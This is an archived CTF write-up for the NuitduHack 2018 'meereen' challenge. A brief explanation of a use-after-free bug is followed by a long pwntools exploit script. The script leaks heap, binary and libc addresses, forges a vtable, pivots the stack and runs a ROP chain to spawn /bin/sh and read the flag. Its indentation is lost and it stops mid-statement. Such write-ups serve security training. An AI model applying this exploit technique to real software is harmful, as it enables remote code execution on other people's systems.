# meereen

**CTF:** NuitduHack 2018 Quals  
**Category:** misc  
**Original writeup:** <https://ctftime.org/writeup/9511> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

# Meereen

## Concept

This challenge is a "Use after free". This vulnerability is easy to find, the masters have slaves, if they are killed the slaves are not aware that the master is no longer there.

First of all, we get the heap address. After we leak vtable address, then libc address and we are good to go.

There is a lot of possibilities for this chall, you could for exemple leak environ to have the stack address, or put your ROP after revolution and do a stack jump to go in your ROP chain

## exploit.py

```

#!/usr/bin/env python

import pwnlib

from pwnlib.util.packing import p64,u64

import re

import struct

import time

import sys

import os

import subprocess

if len(sys.argv) > 4:

binary_filename = os.path.join(sys.argv[4], "meereen")

libc_filename = os.path.join(sys.argv[4], "libc.so.6")

else:

binary_filename = "../src/meereen"

libc_filename = "/lib64/libc.so.6"

default_timeout = 5

class Communicate :

def __init__(self):

pass

def begin(self) :

self.conn.recvuntil("Please enter the name of your city!")

self.send("pycity")

self.conn.recvuntil(">")



def send(self,payload) :

return self.conn.sendline(payload)



def interact(self) :

self.conn.interactive(prompt = pwnlib.term.text.bold_red('$'))

def create(self,name,gold) :

self.send("create")



result = self.conn.recvuntil("Please enter the name : ",timeout=default_timeout)

if result == "" :

raise Exception("error in perso name")

self.send(name)



result = self.conn.recvuntil("Please enter his gold : ",timeout=default_timeout)

if result == "" :

raise Exception("error in perso gold")



self.send(str(gold))

result = self.conn.recvuntil("What type ?

",timeout=default_timeout)

if result == "" :

raise Exception("error in perso type")

def create_master(self,name,gold=0) :

self.create(name,gold)

self.send("master")

retour = self.conn.recvuntil(">",timeout=default_timeout)

if "Master successfully insert" not in retour :

raise Exception("error while inserting master "+name)



def create_slave(self,name,master,gold=0) :

self.create(name,gold)

self.send("slave")

result = self.conn.recvuntil("Enter master's name",timeout=default_timeout)

if result == "":

raise Exception("Error while creating slave")

self.send(master)

retour = self.conn.recvuntil(">",timeout=default_timeout)

if "Slave successfully insert" not in retour :

raise Exception("error while inserting slave "+name)



def kill(self,name) :

self.send("kill")

result = self.conn.recvuntil("Enter the name please : ",timeout=default_timeout)

if result == "" :

raise Exception("Error while entering name")

self.send(name)

if "character successfully killed" not in self.conn.recvuntil(">",timeout=default_timeout) :

raise Exception("error while killing character")

def show(self) :

self.send("show")

retour = self.conn.recvuntil(">",timeout=default_timeout)

if retour == '' :

raise Exception("Error while showing people")

return retour

def end(self) :

self.conn.sendline("quit")

self.conn.recvuntil("Good bye!")

self.conn.close()



class CommunicateLtrace(Communicate) :

def __init__(self) :

self.heap_filename = "heap_trace"

self.conn = pwnlib.tubes.process.process(

[

"ltrace",

"-e", "malloc+free",

"-o", self.heap_filename,

binary_filename

]

)

def end(self) :

Communicate.end(self)

with open(self.heap_filename,"r") as f :

content = f.read()

new_content = ""

for line in content.split("

") :

if "->" in line :

new_content += line.split("->")[1] + "

"



with open(self.heap_filename,"w") as f :

f.write(new_content)

class CommunicateProcess(Communicate) :

def __init__(self) :

self.conn = pwnlib.tubes.process.process(binary_filename)

def end(self) :

Communicate.end(self)

class CommunicateRemote(Communicate) :

def __init__(self,host,port) :

self.conn = pwnlib.tubes.remote.remote(host,port)

def end(self) :

Communicate.end(self)

class MemLeak :

def __init__(self,chall) :

self.chall = chall

self.perso_leak = None

def memory_leak(self,address,size) :

final_size = size

if size < 0x30 :

size = 0x30

perso_leak = "a"*8

perso_leak += p64(address)

perso_leak += p64(size)

perso_leak += p64(size)

perso_leak += p64(size)

perso_leak += p64(size)

self.chall.create_master(perso_leak)

result = self.chall.show()

result = re.findall("My master is : (.{"+str(size)+"})",result)

self.chall.kill(perso_leak)

if len(result) != 1 :

raise Exception("Impossible to leak address")

return result[0][:final_size]

if __name__ == '__main__' :





from argparse import ArgumentParser

binary_elf = pwnlib.elf.elf.ELF(binary_filename)

libc_elf = pwnlib.elf.elf.ELF(libc_filename)



addresse__ZNK6Master4showEv = 0x2db0 # maybe this will change



output, _ = subprocess.Popen(["ROPgadget","--binary",libc_filename],stdout=subprocess.PIPE).communicate()

with open("gadgets","w") as f:

f.write(output)

"""

leak adresses

"""

chall = None

while True :

libc_elf.address = 0

binary_elf.address = 0

if chall != None :

chall.conn.close()

try :



chall = CommunicateRemote(sys.argv[1],sys.argv[2])

chall.begin()



for x in range(9) :

chall.create_master("m"*0x40+"{:d}".format(x))

master_leak = "m" * 0x40 + "3"

chall.create_slave("s"*0x40,master_leak)

for x in range(1,9,2) :

chall.kill("m"*0x40+"{:d}".format(x))



# get heap address for base ref

result = chall.show()

address_heap = u64(re.findall("My master is : (.{8})m{56}3",result)[0])

print "{:30s} : 0x{:x}".format("[+] address heap",address_heap)



# get vtable, text, libc address

mem_leak = MemLeak(chall)



vtable_master = u64(mem_leak.memory_leak(address_heap-0xf0,8))

print "{:30s} : 0x{:x}".format("[+] address vtable master",vtable_master)



address_text = u64(mem_leak.memory_leak(vtable_master,8)) - addresse__ZNK6Master4showEv

print "{:30s} : 0x{:x}".format("[+] address text",address_text)

binary_elf.address = address_text



address_libc = u64(mem_leak.memory_leak(binary_elf.got['fflush'],8)) - libc_elf.symbols["fflush"]

print "{:30s} : 0x{:x}".format("[+] address libc",address_libc)

libc_elf.address = address_libc

"""

Now exploit

"""

gadgets = ""

with open("gadgets") as f :

gadgets = f.read()

def get_gadget(my_gadget) :

gadget = re.findall("(0x[a-f0-9]{16}) : "+my_gadget,gadgets)

print gadget

return int(gadget[0],16)



stack_pivot = get_gadget("add rsp, 0x450 ; pop rbx ; ret

") + libc_elf.address

ret = get_gadget("ret

") + libc_elf.address

pop_rdi = get_gadget("pop rdi ; ret

") + libc_elf.address

fake_vtable = address_heap + 0x130

perso_tnt = p64(fake_vtable)

perso_tnt += p64(fake_vtable)

perso_tnt += p64(0x40)

perso_tnt += p64(stack_pivot)

perso_tnt += p64(stack_pivot)

perso_tnt += p64(stack_pivot)



chall.create_master(perso_tnt)

chall.conn.send(p64(ret)*500+p64(pop_rdi)+p64(next(libc_elf.search("/bin/sh"))) + p64(libc_elf.symbols["system"]) )

chall.conn.recvuntil("

>")

chall.conn.sendline("revolution")

the_end = chall.conn.recvuntil("Kill the masters ! get all their gold", timeout=default_timeout)

if the_end == "":

raise Exception("revolution didn't work as expected")

chall.conn.sendline("cat /home/my_chall_pwned/flag && exit")

result = chall.conn.recvall(timeout=default_timeout)

result = re.findall("(NDH\\{[^

]*\\})",result)

if len(result) == 0 :

raise Exception("can't find the flag")

print result[0]

exit()

except Exception as e :
